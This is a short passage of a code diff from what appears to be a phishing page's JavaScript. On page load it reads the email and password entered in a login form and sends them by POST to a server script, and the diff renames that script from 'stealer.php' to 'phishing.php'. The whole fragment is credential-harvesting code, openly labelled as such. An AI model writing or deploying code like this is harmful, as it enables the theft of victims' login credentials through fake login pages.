@@ -5,7 +5,7 @@ document.addEventListener("DOMContentLoaded", function() {
         let email = document.getElementById("email").value;
         let password = document.getElementById("password").value;
 
-        fetch("stealer.php", {
+        fetch("phishing.php", {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
